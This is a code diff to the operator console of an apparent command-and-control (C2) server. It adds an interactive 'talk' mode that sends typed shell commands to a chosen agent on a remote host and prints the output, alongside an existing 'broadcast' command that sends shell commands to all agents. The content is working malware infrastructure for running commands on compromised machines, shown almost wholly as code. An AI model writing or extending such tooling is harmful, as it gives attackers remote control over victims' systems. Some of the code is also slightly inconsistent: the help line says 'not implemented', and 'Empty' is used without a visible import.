@@ -1,5 +1,6 @@
 
 import json
+import time, sys
 from c2.server.session import SessionRegistry
 from c2.server.protocol import exec_request
 from c2.server.transport import send_message
@@ -22,6 +23,7 @@ class CLI:
   broadcast <command>      Send shell command to all agents
   read <short_id>          Read next incoming message for agent (non-blocking)
   logs [n]                 Show last n lines from server.log (default 50)
+  talk                     Interactive shell with selected agent (not implemented)
   quit                     Shutdown server
 """)
 
@@ -115,3 +117,43 @@ class CLI:
                 print(line.rstrip())
         except Exception as e:
             print("Failed to read logs:", e)
+
+    def interactive_talk(self, short_prefix: str):
+        a = self.reg.get_by_short_prefix(short_prefix)
+        if not a:
+            print("Agent not found by that short id."); return
+        self.selected_uuid = a.info.uuid
+        print(f"Interactive with {a.short} ({a.info.hostname}). Type ':quit' or CTRL+C to exit.")
+        while True:
+            try:
+                cmd = input(f"{a.short}$ ").strip()
+            except (KeyboardInterrupt, EOFError):
+                print("\nExiting."); break
+            if not cmd: 
+                continue
+            if cmd in (":quit", ":q", "quit", "exit"):
+                break
+            try:
+                with a.lock: 
+                    send_message(a.conn, exec_request(cmd))
+                self.logger.info("Interactive to %s: %s", a.short, cmd)
+            except Exception as e:
+                print(f"[send failed] {e}"); continue
+
+            # Wait for next exec_result, print raw stdout/stderr
+            t0, timeout = time.time(), 30.0
+            while True:
+                if time.time() - t0 > timeout:
+                    print("[timeout]"); break
+                try:
+                    msg = a.inbox.get(timeout=0.2)
+                except Empty:
+                    continue
+                if isinstance(msg, dict) and msg.get("type") == "exec_result":
+                    p = msg.get("payload", {})
+                    out, err = p.get("stdout", ""), p.get("stderr", "")
+                    if out:
+                        sys.stdout.write(out + ("" if out.endswith("\n") else "\n")); sys.stdout.flush()
+                    if err:
+                        sys.stderr.write(err + ("" if err.endswith("\n") else "\n")); sys.stderr.flush()
+                    break        
